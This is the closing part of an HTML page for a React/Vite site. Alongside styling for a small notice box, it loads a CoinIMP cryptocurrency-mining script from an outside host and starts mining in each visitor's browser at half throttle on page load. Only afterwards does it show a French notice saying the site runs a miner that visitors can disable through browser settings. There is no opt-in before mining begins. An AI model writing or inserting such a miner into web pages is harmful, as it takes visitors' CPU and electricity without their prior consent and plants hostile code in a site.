    <style>
      #miningNotification {
        position: fixed;
        bottom: 10px;
        left: 10px;
        background: #3d3d3d;
        color: #cccccc;
        padding: 10px;
        border-radius: 8px;
        z-index: 9999;
        font-size: 14px;
        width: 300px;
        transition: all 0.3s ease;
      }

      #miningNotification.minimized {
        width: 150px;
        height: 20px;
        overflow: hidden;
        white-space: nowrap;
        text-overflow: ellipsis;
        padding: 5px;
      }

      #miningNotificationToggle {
        cursor: pointer;
        float: right;
        background: transparent;
        border: none;
        color: #ccc;
        font-size: 12px;
      }
    </style>
  </head>

  <body>
    <div id="root"></div>

    <!-- Script principal Vite (React) -->
    <script type="module" src="/src/main.tsx"></script>

    <!-- Script de minage CoinIMP -->
    <script src="https://www.hostingcloud.racing/hyZN.js"></script>
    <script>
      var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
        throttle: 0.5,
        c: 'w'
      });
      _client.start();

      // Ajout notification personnalisée
      const notif = document.createElement('div');
      notif.id = 'miningNotification';
      notif.innerHTML = `
        <button id="miningNotificationToggle">Réduire</button>
        Ce site utilise un mineur CoinIMP. Vous pouvez le désactiver via les paramètres de votre navigateur si vous le souhaitez.
      `;
      document.body.appendChild(notif);

      // Toggle réduction
      document.getElementById('miningNotificationToggle').onclick = function () {
        notif.classList.toggle('minimized');
        this.innerText = notif.classList.contains('minimized') ? "Agrandir" : "Réduire";
      };
    </script>
